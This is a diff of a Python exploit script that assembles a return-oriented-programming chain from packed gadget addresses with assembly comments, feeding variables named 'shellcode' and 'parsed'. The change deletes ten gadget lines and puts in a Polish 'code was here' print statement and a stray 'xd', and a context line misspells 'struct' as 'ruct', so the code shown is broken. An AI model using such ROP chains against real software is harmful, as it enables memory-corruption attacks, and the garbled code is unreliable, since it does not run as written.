@@ -99,16 +99,8 @@ shellcode += ruct.pack(">I", 0xffff1d6b) #add esp,byte +0x1c # pop ebp # ret
         parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
         parsed += struct.pack(">I", 0x8fe2c71d) #mov eax,edx # ret
         parsed += struct.pack(">I", 0x8fe2def4) #add eax,ecx # ret
-        parsed += struct.pack(">I", 0x8fe0e32d) #xchg eax,edx
-        parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
-        parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
-        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
-        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
-        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
-        parsed += struct.pack(">I", 0x8fe2def4) #add eax,ecx # ret # swap back
-        parsed += struct.pack(">I", 0x8fe0e32d) #xchg eax,edx # copy parameter to placeholder
-        parsed += struct.pack(">I", 0x8fe2fb61) #mov [eax],edx # pop eax # ret # set our stack pointer back to original value
-        parsed += struct.pack(">I", 0x8fe0e32d) #xchg eax,edx
+        print("tu był kod")
+        xd
         parsed += struct.pack(">I", 0x8fe2daea) #sub eax,ecx # ret
         parsed += struct.pack(">I", 0x8fe0b1c2) #xchg eax,ebp # inc ebp # ret
         parsed += struct.pack(">I", 0x8fe2b6a5) #dec ebp # ret
